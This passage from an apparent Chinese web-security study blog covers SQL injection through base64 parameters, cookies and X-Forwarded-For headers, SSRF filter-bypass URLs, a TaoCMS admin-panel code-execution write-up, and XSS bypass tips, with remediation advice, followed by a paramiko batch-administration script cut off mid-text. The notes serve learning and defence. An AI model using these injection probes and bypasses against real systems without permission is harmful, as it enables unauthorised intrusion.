<li><h2 id="base64注入攻击"><a href="#base64注入攻击" class="headerlink" title="base64注入攻击"></a>base64注入攻击</h2><ul>
<li><p>如果遇到url的参数id的值看起来像base64的，先拿去url解码，然后如果是base64，拿去base64解码，解出来的应该就是id的值（1，2等数字）；</p>
</li>
<li><p>那么如果要对这个url进行sql注入测试，就需要对id后面的所有值进行base64编码；</p>
</li>
<li><p>注入的方式步骤都是跟union注入一样的，只不过后面的所有值（整个payload）都要进行base64编码后传给url的c参数提交，包括闭合规则。</p>
</li>
</ul>
</li>
<li><h2 id="HTTP请求头参数注入-cookie注入攻击"><a href="#HTTP请求头参数注入-cookie注入攻击" class="headerlink" title="HTTP请求头参数注入-cookie注入攻击"></a>HTTP请求头参数注入-cookie注入攻击</h2><ul>
<li><p>抓包对一个url的http请求头的所有参数进行sql注入测试，里面的所有参数都有可能存在注入点，如果响应包出现sql报错，那么测试的这个参数就是注入点；</p>
</li>
<li><p>常见的http头部注入的参数有：【Referer】、【X-Forwarded-For】、【Cookie】、【X-Real-IP】、【Accept-Language】、【Authorization】如果测试到cookie参数的时候，响应有报sql错误，那么就是cookie注入攻击；</p>
</li>
<li><p>和union注入的差别就在于注入点不一样，之后使用union注入的方法即可。</p>
</li>
</ul>
</li>
<li><h2 id="HTTP请求头参数注入-XFF注入攻击"><a href="#HTTP请求头参数注入-XFF注入攻击" class="headerlink" title="HTTP请求头参数注入-XFF注入攻击"></a>HTTP请求头参数注入-XFF注入攻击</h2><ul>
<li><p>XFF注入即HTTP头部的X-Forwarded-for参数存在sql注入；</p>
</li>
<li><p>例如测试此参数的值  X-Forwarded-for:127.0.0.1’  响应有sql报错，那么此处就是注入点；</p>
</li>
<li><p>之后使用union注入的方法完成即可。</p>
</li>
</ul>
</li>
</ul>
<h1 id="SQL注入修复方案"><a href="#SQL注入修复方案" class="headerlink" title="SQL注入修复方案"></a>SQL注入修复方案</h1><ul>
<li><p>解决SQL注入问题的关键是对所有可能来自用户输入的数据进行严格的检查、对数据库配置使用最小权限原则。</p>
</li>
<li><p>1、所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。</p>
</li>
<li><p>2、对进入数据库的特殊字符（’”\，括号&amp;*;等）进行转义处理，或编码转换。</p>
</li>
<li><p>3、严格限制变量类型，比如整型变量就采用intval()函数过滤，数据库中的存储字段必须对应为int型。</p>
</li>
<li><p>4、数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。</p>
</li>
<li><p>5、网站每个数据层的编码统一，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过。</p>
</li>
<li><p>6、严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害。</p>
</li>
<li><p>7、避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。</p>
</li>
<li><p>8、在网站发布之前建议使用一些专业的SQL注入检测工具进行检测，及时修补这些SQL注入漏洞。</p>
</li>
<li><p>9、确认PHP配置文件中的magicquotesgpc选项保持开启</p>
</li>
<li><p>10、配置安全狗，阿里云盾，等网络安全公司的产品</p>
</li>
</ul>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>SSRF服务器端请求伪造</title>
    <url>/2022/03/08/SSRF%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/</url>
    <content><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>SSRF服务器端请求伪造是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。<span id="more"></span>（正是因为 它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。 注释：除了http/https等方式可以造成ssrf，类似tcp connect 方式也可以探测内网一些ip 的端口是否开发服务，只不过危害比较小而已。</p>
<h2 id="可实现攻击"><a href="#可实现攻击" class="headerlink" title="可实现攻击"></a>可实现攻击</h2><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>	可以对服务器所在内网、本地进行端口扫描，获取一些服务的banner信息<span class="comment">;</span></span><br><span class="line"><span class="number">2</span>	攻击运行在内网或本地的应用程序（比如溢出）<span class="comment">;</span></span><br><span class="line"><span class="number">3</span>	对内网web应用进行指纹识别，通过访问默认文件实现<span class="comment">;</span></span><br><span class="line"><span class="number">4</span>	攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）<span class="comment">;</span></span><br><span class="line"><span class="number">5</span>	利用file协议读取本地文件等。</span><br></pre></td></tr></table></figure>

<h2 id="可能出现的地方"><a href="#可能出现的地方" class="headerlink" title="可能出现的地方"></a>可能出现的地方</h2><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>社交分享功能：获取超链接的标题等内容进行显示</span><br><span class="line"><span class="number">2.</span>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</span><br><span class="line"><span class="number">3.</span>在线翻译：给网址翻译对应网页的内容</span><br><span class="line"><span class="number">4.</span>图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</span><br><span class="line"><span class="number">5.</span>图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</span><br><span class="line"><span class="number">6.</span>云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</span><br><span class="line"><span class="number">7.</span>网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</span><br><span class="line"><span class="number">8.</span>数据库内置功能：数据库的比如mongodb的copyDatabase函数</span><br><span class="line"><span class="number">9.</span>邮件系统：比如接收邮件服务器地址</span><br><span class="line"><span class="number">10.</span>编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，<span class="type">xml</span>处理器等</span><br><span class="line"><span class="number">11.</span>未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞 一些的url中的关键字：<span class="keyword">share</span>、wap、url、link、src、source、target、u、<span class="number">3</span>g、display、sourceURl、imageURL、<span class="keyword">domain</span>……</span><br><span class="line"><span class="number">12.</span>从远程服务器请求资源（upload <span class="keyword">from</span> url 如discuz！；<span class="keyword">import</span> &amp; expost rss feed 如web blog；使用了<span class="type">xml</span>引擎对象的地方 如wordpress xmlrpc.php）</span><br></pre></td></tr></table></figure>

<h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">1.让服务端去访问相应的网址</span><br><span class="line">2.让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms</span><br><span class="line">3.可以使用<span class="meta">file</span>、dict、gopher[11]、ftp协议进行请求访问相应的文件</span><br><span class="line">4.攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包&#123;payload&#125;）</span><br><span class="line">5.攻击内网应用程序（利用跨协议通信技术）</span><br><span class="line">6.判断内网主机是否存活：方法是访问看是否有端口开放</span><br><span class="line">7.DoS攻击（请求大文件，始终保持连接<span class="meta">keep</span>-alive always）</span><br></pre></td></tr></table></figure>

<h2 id="限制绕过"><a href="#限制绕过" class="headerlink" title="限制绕过"></a>限制绕过</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.http:<span class="regexp">//</span>baidu.com@www.baidu.com<span class="regexp">/与http:/</span><span class="regexp">/www.baidu.com/</span>请求时是相同的</span><br><span class="line"><span class="number">2</span>.各种IP地址的进制转换</span><br><span class="line"><span class="number">3</span>.URL跳转绕过：http:<span class="regexp">//</span>www.hackersb.cn<span class="regexp">/redirect.php?url=http:/</span><span class="regexp">/192.168.0.1/</span></span><br><span class="line"><span class="number">4</span>.短网址绕过http:<span class="regexp">//</span>t.cn/RwbLKDx </span><br><span class="line"><span class="number">5</span>.xip.io来绕过：http:<span class="regexp">//</span>xxx.<span class="number">192.168</span>.<span class="number">0.1</span>.xip.io/== <span class="number">192.168</span>.<span class="number">0.1</span> (xxx 任意） 指向任意ip的域名：xip.io(<span class="number">37</span>signals开发实现的定制DNS服务)</span><br><span class="line"><span class="number">6</span>.限制了子网段，可以加 :<span class="number">80</span> 端口绕过。http:<span class="regexp">//</span>tieba.baidu.com<span class="regexp">/f/</span>commit<span class="regexp">/share/</span>openShareApi?url=http:<span class="regexp">//</span><span class="number">10.42</span>.<span class="number">7.78</span>:<span class="number">80</span></span><br><span class="line"><span class="number">7</span>.探测内网域名，或者将自己的域名解析到内网ip</span><br><span class="line"><span class="number">8</span>.例如http:<span class="regexp">//</span><span class="number">10.153</span>.<span class="number">138.81</span><span class="regexp">/ts.php, 修复时容易出现的获取host时以/</span>分割来确定host， 但这样可以用http:<span class="regexp">//</span>abc@<span class="number">10.153</span>.<span class="number">138.81</span>/绕过</span><br></pre></td></tr></table></figure>

<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">1</span>	过滤内网服务器对公网服务器请求的响应。如果Web应用是获取某一类型的文件，在把返回结果展示给用户之前应先验证返回的信息是否符合文件类型标准，比如返回信息应为图片，如果返回信息是HTML，则停止将返回信息返回客户端。</span><br><span class="line"><span class="attribute">2</span>	统一错误提示信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</span><br><span class="line"><span class="attribute">3</span>	在内网服务器的防火墙上限制公网服务器的请求端口为HTTP等协议常用端口，如：<span class="number">80</span>、<span class="number">443</span>、<span class="number">8080</span>、<span class="number">8090</span>。</span><br><span class="line"><span class="attribute">4</span>	若公网服务器的内网IP与内网无业务通信，建议将公网服务器对应的内网IP列入黑名单，避免应用被用来获取内网数据。</span><br><span class="line"><span class="attribute">5</span>	内网服务器禁用不必要的协议，仅允许HTTP和HTTPS请求，防止类似于file:///、gopher://、ftp:// 等协议引起的安全问题。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>TaoCMS存在代码执行漏洞</title>
    <url>/2022/03/08/TaoCMS%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="一、漏洞介绍"><a href="#一、漏洞介绍" class="headerlink" title="一、漏洞介绍"></a>一、漏洞介绍</h1><p>TaoCMS是基于php+sqlite/mysql的国内最小(100Kb左右)的功能完善的CMS管理系统taoCMS-基于php+sqlite最小巧的CMS，TaoCMS系统存在代码执行漏洞，可以执行任意php文件。</p>
<span id="more"></span>
<h1 id="二、-漏洞细节"><a href="#二、-漏洞细节" class="headerlink" title="二、 漏洞细节"></a>二、 漏洞细节</h1><p>在include\Model\File.php 55行edit()代码,代码可以看出可以编辑任意文件，包括php文件。</p>
<p><img src="https://ax-x.github.io/2022/03/08/TaoCMS%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20220830155608718.png" alt="image-20220830155608718"></p>
<p>而save()保存函数，对文件没有进行任何验证便保存下来，造成代码执行漏洞。</p>
<p> <img src="https://ax-x.github.io/2022/03/08/TaoCMS%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20220830155816381.png" alt="image-20220830155816381"></p>
<h1 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3 漏洞利用"></a>3 漏洞利用</h1><p>漏洞验证：</p>
<p>首先进入后台，点击文件管理。</p>
<p> <img src="https://ax-x.github.io/2022/03/08/TaoCMS%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20220830155826832.png" alt="image-20220830155826832"></p>
<p>在api.php文件后面点编辑，并在第一行添加代码 phpinfo();</p>
<p> <img src="https://ax-x.github.io/2022/03/08/TaoCMS%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20220830155840712.png" alt="image-20220830155840712"></p>
<p>保存后访问api.php,成功执行代码。</p>
<p> <img src="https://ax-x.github.io/2022/03/08/TaoCMS%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20220830155849238.png" alt="image-20220830155849238"></p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>PHP代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS跨站脚本攻击</title>
    <url>/2022/01/17/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h1 id="什么是XSS-XSS原理"><a href="#什么是XSS-XSS原理" class="headerlink" title="什么是XSS/XSS原理"></a>什么是XSS/XSS原理</h1><ul>
<li><p>攻击者嵌入恶意脚本代码到用户会访问到的页面中，用户访问该页面的时候，就引起恶意脚本代码的执行，从而达到恶意攻击用户的目的。攻击者可以使用户在浏览器中执行其预定义的恶意脚本，变量接受数据的时候，数据可以写成js脚本代码，进行回显操作</p>
</li>
<li><p>本质上属于前端漏洞，产生在浏览器和js代码中的漏洞</p>
<span id="more"></span></li>
</ul>
<h1 id="XSS类型"><a href="#XSS类型" class="headerlink" title="XSS类型"></a>XSS类型</h1><ul>
<li><p>反射型XSS(非持续型XSS)</p>
</li>
<li><p>储存型XSS(持续型XSS）</p>
</li>
<li><p>DOM XSS</p>
</li>
</ul>
<h1 id="具体区别"><a href="#具体区别" class="headerlink" title="具体区别"></a>具体区别</h1><ul>
<li><p>反射型：数据提交过去时，会在代码执行之后直接反馈回来发包x=zzx=&gt;x.php=&gt;回包</p>
</li>
<li><p>存储型：数据提交过去时，会在代码执行之后储存到数据库的某个表里，然后反馈回来发包x=zzx=&gt;x.php=&gt;写到数据库某个表=&gt;x.php&gt;回显</p>
</li>
<li><p>DOM型：发包x=zzx=&gt;本地浏览器静态前端代码=&gt;x.php</p>
</li>
<li><p>反射型和储存型属于后端语言进行数据处理，而DOM型是用js代码进行处理 </p>
</li>
</ul>
<h1 id="三者原理"><a href="#三者原理" class="headerlink" title="三者原理"></a>三者原理</h1><ul>
<li><p>反射型XSS：应用或API没有对用户输入数据进行验证或没进行转义然后作为HTML的输出的一部分，能够使得攻击者在受害者的浏览器上执行任意HTML和JavaScript。</p>
</li>
<li><p>存储型XSS：应用或API存储未格式化的用户输入，且该输入之后会被其他用户或管理员浏览到。</p>
</li>
<li><p>DOM XSS：动态包含攻击者可控制数据到页面中的JavaScript框架， 单页应用，API易受DOM XSS。</p>
</li>
<li><p>涉及函数类：常见的输出类函数</p>
</li>
</ul>
<h1 id="如何检测"><a href="#如何检测" class="headerlink" title="如何检测"></a>如何检测</h1><ul>
<li><p>方法一： 查看代码，查找关键的变量,   客户端将数据传送给Web 服务端一般通过三种方式 Querystring, Form表单，以及cookie.  例如在ASP的程序中，通过Request对象获取客户端的变量。 假如变量没有经过htmlEncode处理， 那么这个变量就存在一个XSS漏洞</p>
</li>
<li><p>方法二：xss跨站漏洞测试语句， 在网页中的Textbox或者其他能输入数据的地方，输入测试语句， 看能不能弹出对话框，能弹出的话说明存在XSS漏洞， 在URL中查看有那些变量通过URL把值传给Web服务器， 把这些变量的值退换成测试语句。  然后看是否能执行</p>
</li>
<li><p>方法三:  自动化测试XSS漏洞</p>
</li>
</ul>
<h1 id="可能存在XSS漏洞点"><a href="#可能存在XSS漏洞点" class="headerlink" title="可能存在XSS漏洞点"></a>可能存在XSS漏洞点</h1><ul>
<li>用户能够输入提交数据的地方，文本框，url，请求头等等</li>
</ul>
<h1 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h1><ul>
<li><p>如劫持用户会话，插入恶意内容、重定向用户、使用恶意软件劫持用户浏览器、繁殖XSS蠕虫，甚至破坏网站、修改路由器配置信息等。</p>
</li>
<li><p>XSS实质上就是JS脚本，任何JS脚本能实现的功能，XSS也能实现能做到的Cookie劫持、构造GET和POST请求、XSS钓鱼、识别用户浏览器、识别用户安装的软件等</p>
</li>
</ul>
<h1 id="防范修复"><a href="#防范修复" class="headerlink" title="防范修复"></a>防范修复</h1><ul>
<li><p>前端采用大型框架Angular,Vue,React等等。</p>
</li>
<li><p>用session代替cookie。</p>
</li>
<li><p>对于用户输入的数据要严格过滤写入数据库的数据，一定要保证合理过滤。</p>
</li>
<li><p>对于所有输出的地方，一定要做好过滤工作，比如采用模版渲染等等。</p>
</li>
<li><p>使用Token</p>
</li>
<li><p>使用HttpOnly</p>
</li>
</ul>
<h1 id="什么是HttpOnly？"><a href="#什么是HttpOnly？" class="headerlink" title="什么是HttpOnly？"></a>什么是HttpOnly？</h1><ul>
<li>如果在cookie中设置了HTTPonly属性，那么通过js脚本将无法读取到cookie信息，这样能有效防止XSS攻击。</li>
</ul>
<h1 id="绕过httponly"><a href="#绕过httponly" class="headerlink" title="绕过httponly"></a>绕过httponly</h1><ul>
<li><p>浏览器未保存账号密码：需要XSS产生登录地址，利用表单劫持</p>
</li>
<li><p>浏览器保存了账号密码：产生后台的XSS，储存型XSS，如留言等，利用浏览器读取账号密码</p>
</li>
</ul>
<h1 id="如何绕过"><a href="#如何绕过" class="headerlink" title="如何绕过"></a>如何绕过</h1><ul>
<li><p>修改编码格式</p>
</li>
<li><p>加密解密算法</p>
</li>
<li><p>结合其他漏洞绕过</p>
</li>
<li><p>大小写onerror函数</p>
</li>
<li><p>配合平台，例如<a href="http://xssfuzzer.com/">xssfuzzer.com</a>生成语句</p>
</li>
<li><p>工具：Xwaf,XSStrike</p>
</li>
</ul>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>python&amp;&amp;shell--批量跑主机脚本</title>
    <url>/2022/01/21/python-shell-%E6%89%B9%E9%87%8F%E8%B7%91%E4%B8%BB%E6%9C%BA%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>上周去现场，大佬说年前要跑主机脚本，就是服务器有点多，问有没有办法一键下发，然后执行脚本去跑，跑完之后回收数据，我听这需求，这不是有手就行？然后就应了下来，说我试试，我本以为就是简单的写个py脚本的事情，确认好需求之后就直接开整，刚开始我写的是使用ssh服务去批量搞。</p>
<span id="more"></span>

<h1 id="二、python实现"><a href="#二、python实现" class="headerlink" title="二、python实现"></a>二、python实现</h1><p>先确定下流程，大概的流程就是这四个：</p>
<ol>
<li>连接服务器</li>
<li>上传脚本</li>
<li>执行脚本</li>
<li>回收数据</li>
</ol>
<p>最重要的是先连接上去，不然想得再好都没用，连接的话我用是py的paramiko，功能挺强大的，Paramiko是用py写的一个模块，远程连接到Linux服务器，查看上面的日志状态，批量配置远程服务器，文件上传，文件下载等都可以，除此之外我还用到了pandas，毕竟要批量的话，要去读取表格数据，从表格里面去获取每一台主机的信息，而在paramiko的连接这块有几个坑，首先是连接上去，连接上去有很多种方式，首先分为两大类，一类是SSH，一类是FTP，然后每一类都有两种连接方式，一种是基于密码，一种是基于密钥。先说下SSH连接上去的：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ssh = paramiko.SSHClient()</span><br><span class="line">ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">ssh.connect(<span class="string">&quot;IP&quot;</span>,<span class="number">22</span>,<span class="string">&quot;user&quot;</span>, <span class="string">&quot;password&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>这个的话是没办法上传下载文件的，如果我们要上传文件上去，并且回收数据的话，用这种是没办法实现的，当然也可能是我太菜了，如果有大铁子能实现，麻烦带带小弟。所以这边我使用的是Transport，这种方式连接上去之后能够实现很多功能，可以说是一个小型的putty了。</p>
<p>关键代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment">#获取表格数据</span></span><br><span class="line">df = pd.read_excel(<span class="string">&#x27;server_information.xlsx&#x27;</span>)</span><br><span class="line">data=df.values</span><br><span class="line"><span class="comment">#获取单列长度，之后可以作为循环次数的依据</span></span><br><span class="line">L = <span class="built_in">len</span>(df)</span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">#这里做了个分割，是因为下面这块我把for去掉了，上面的表格是需要循环的时候用的，下面针对单个服务器进行说明</span></span><br><span class="line">IP = data[i][<span class="number">0</span>]</span><br><span class="line">port = data[i][<span class="number">1</span>]</span><br><span class="line">name=data[i][<span class="number">2</span>]</span><br><span class="line">password=data[i][<span class="number">3</span>]</span><br><span class="line"><span class="comment"># 实例化一个transport对象</span></span><br><span class="line">trans = paramiko.Transport((IP, port))</span><br><span class="line"><span class="comment"># 建立连接</span></span><br><span class="line">trans.connect(username=name, password=password)</span><br><span class="line"><span class="comment"># 将sshclient的对象的transport指定为以上的trans</span></span><br><span class="line">ssh = paramiko.SSHClient()</span><br><span class="line">ssh._transport = trans</span><br><span class="line">sftp = paramiko.SFTPClient.from_transport(trans)</span><br><span class="line"><span class="comment">#下面是执行了获取IP的命令，因为回收的数据命名格式有根据本机IP来，所以这里先获取下IP</span></span><br><span class="line"><span class="comment"># stdout 为正确输出，stderr为错误输出，同时是有1个变量有值</span></span><br><span class="line">stdin, stdout, stderr = ssh.exec_command(<span class="string">&#x27;ip a|grep inet|grep brd&#x27;</span>)</span><br><span class="line"><span class="comment"># inet 10.0.20.12/22 brd 10.0.23.255 scope global eth0</span></span><br><span class="line"><span class="comment"># 打印执行结果</span></span><br><span class="line">i_IP = stdout.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">Intranet_IP_str= i_IP.split()</span><br><span class="line">Intranet_IP = Intranet_IP_str[<span class="number">1</span>].split(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line"><span class="comment"># 10.0.20.12 22</span></span><br></pre></td></tr></table></figure>

<p>这两种连接方式我用的都是账号密码连接登录，用密钥的话也可以，具体的可以去百度下用法，其实都差不多。连接上去之后，你以为就搞定了，确实是能上传下载文件的，但是还是有坑，这里离谱的一点就是，连接上去之后你没办法去到别的文件夹下面，也就是说，你始终在根目录下面。</p>
<p><img src="https://ax-x.github.io/2022/01/21/python-shell-%E6%89%B9%E9%87%8F%E8%B7%91%E4%B8%BB%E6%9C%BA%E8%84%9A%E6%9C%AC/image-20220109152332407-16417130136852.png" alt="image-20220109152332407"></p>
<p>后面我去找了好久，看了下exec_command的说明才知道，原来每次执行完之后，他都会跳回到原目录下面，也就是说，虽然你执行了cd命令，但是他cd过去之后由于这个函数的原因，他会自己回到原来的目录下面，这就难搞了，我怎么去到我想要的那个文件夹下面去执行文件啊，本来试了下，根据路径去执行文件，但是试了几次发现不行，它只支持执行本目录的文件。</p>
<p>找了一段时间之后，发现可以cd到别的文件夹下面，但是需要去写别的东西，然后为了偷懒，我开始尝试一次执行多条命令，毕竟两条命令搞不定，我就一条命令完成，但是拼接也不是我们用的那种&amp;&amp;了，这个函数有个独特的地方就是，它自带了一个执行多条命令的功能，在一条命令后面使用“;”就可以把命令隔开，看成是两条命令了，例如</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">stdin, stdout, stderr = ssh.exec_command(<span class="string">&#x27;cd tmp;ls&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2022/01/21/python-shell-%E6%89%B9%E9%87%8F%E8%B7%91%E4%B8%BB%E6%9C%BA%E8%84%9A%E6%9C%AC/image-20220109152452438-16417130933893.png" alt="image-20220109152452438"></p>
<p>它就会先cd到tmp这个目录下面，然后执行ls命令，到这无法上传下载文件，无法跳转目录两个坑基本上就填上了，这里贴下完整的数据，表格的格式是IP，端口，用户名，密码。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">df = pd.read_excel(<span class="string">&#x27;server_information.xlsx&#x27;</span>)</span><br><span class="line">data=df.values</span><br><span class="line">L = <span class="built_in">len</span>(df)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;检测到当前主机数：&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(L)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,L):</span><br><span class="line">    IP = data[i][<span class="number">0</span>]</span><br><span class="line">    port = data[i][<span class="number">1</span>]</span><br><span class="line">    name=data[i][<span class="number">2</span>]</span><br><span class="line">    password=data[i][<span class="number">3</span>]</span><br><span class="line">    <span class="comment"># 实例化一个transport对象</span></span><br><span class="line">    trans = paramiko.Transport((IP, port))</span><br><span class="line">    <span class="comment"># 建立连接</span></span><br><span class="line">    trans.connect(username=name, password=password)</span><br><span class="line">    <span class="comment"># 将sshclient的对象的transport指定为以上的trans</span></span><br><span class="line">    ssh = paramiko.SSHClient()</span><br><span class="line">    ssh._transport = trans</span><br><span class="line">    sftp = paramiko.SFTPClient.from_transport(trans)</span><br><span class="line">    stdin, stdout, stderr = ssh.exec_command(<span class="string">&#x27;ip a|grep inet|grep brd&#x27;</span>)</span><br><span class="line">    <span class="comment"># inet 10.0.20.12/22 brd 10.0.23.255 scope global eth0</span></span><br><span class="line">    i_IP = stdout.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    Intranet_IP_str= i_IP.split()</span><br><span class="line">    Intranet_IP = Intranet_IP_str[<span class="number">1</span>].split(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    <span class="comment"># 10.0.20.12 22</span></span><br><span class="line">    <span class="comment">#localpath—本地文件地址，remotepath——服务器存放地址</span></span><br><span class="line">    sftp.put(localpath=<span class="string">&#x27;/home/a.sh&#x27;</span>,</span><br><span class="line">             remotepath=<span class="string">&#x27;/tmp/a.sh&#x27;</span>)</span><br><span class="line">    stdin, stdout, stderr = ssh.exec_command(<span class="string">&#x27;cd tmp;./a.sh&#x27;</span>)</span><br><span class="line">    Host_information = stdout.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">10</span>)</span><br><span class="line">    sftp.get(localpath=Intranet_IP[<span class="number">0</span>]+<span class="string">&#x27;.xml&#x27;</span>,</span><br><span class="line">             remotepath=<span class="string">&#x27;/tmp/&#x27;</span>+Intranet_IP[<span class="number">0</span>]+<span class="string">&#x27;.xml&#x27;</span>)</span><br><span class="line">    <span class="comment">#sftp.get—下载文件，sftp.put—上传文件</span></span><br><span class="line">    <span class="built_in">print</span>(IP+<span class="string">&quot;:已完成&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2022/01/21/python-shell-%E6%89%B9%E9%87%8F%E8%B7%91%E4%B8%BB%E6%9C%BA%E8%84%9A%E6%9C%AC/image-20220115172343072-164223862468715.png" alt="image-20220115172343072"></p>
<p>当我开开心心提交过去给客户的时候，不出意外要有意外了，客户说想要shell脚本，啊这，也行！shell而已，这回先把客户那边开放的端口，服务啥的给问清楚，具体需要我做到什么，先了解清楚了先，然后一番讨价还价下来，客户说他那边有个平台能批量上传和运行文件了，叫我实现下回收就行了，那这还不好办。</p>
<h1 id="三、shell脚本实现"><a href="#三、shell脚本实现" class="headerlink" title="三、shell脚本实现"></a>三、shell脚本实现</h1><p>回到脚本这来，已知客户需要的是shell脚本，那怎么办呢，其实shell也有支持连接其他服务器的功能，而且方式还很多，写的话也不难写，话不多说，开整。首先我想的还是用ftp服务，毕竟这个能满足所有需求，然后我就搞了个ftp的。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash">用户名</span></span><br><span class="line">user=</span><br><span class="line"><span class="meta">#</span><span class="bash">密码</span></span><br><span class="line">password=</span><br><span class="line"><span class="meta">#</span><span class="bash">本地存在这个文件的目录</span></span><br><span class="line">local_url=/tmp</span><br><span class="line"><span class="meta">#</span><span class="bash">上传的目的目录</span></span><br><span class="line">server_url=/home</span><br><span class="line"><span class="meta">#</span><span class="bash">服务器IP</span></span><br><span class="line">ip=</span><br><span class="line"><span class="meta">#</span><span class="bash">端口</span></span><br><span class="line">port=22</span><br><span class="line">cd $&#123;local_url&#125;;</span><br><span class="line"><span class="meta">#</span><span class="bash">定位在50分钟内生成的xml文件，这个可以根据自己的需求来改需要回收的数据类型</span></span><br><span class="line">files=`find $&#123;local_url&#125; -mmin -50 -name &#x27;*.xml&#x27;`</span><br><span class="line">for file in $&#123;files&#125;</span><br><span class="line">do</span><br><span class="line">	echo $&#123;file&#125;</span><br><span class="line"><span 